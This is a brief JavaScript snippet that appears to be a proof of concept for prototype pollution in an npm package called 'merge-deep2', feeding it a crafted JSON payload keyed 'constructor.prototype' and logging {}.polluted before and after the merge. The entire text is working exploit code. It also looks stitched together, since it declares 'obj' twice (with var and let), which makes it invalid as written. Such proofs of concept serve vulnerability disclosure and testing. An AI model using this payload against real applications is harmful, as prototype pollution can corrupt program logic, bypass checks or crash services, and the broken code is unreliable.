var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const mergeDeep2 = require('merge-deep2');
let obj = {};
let malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
mergeDeep2(obj, JSON.parse(malicious_payload), true);
console.log({}.polluted);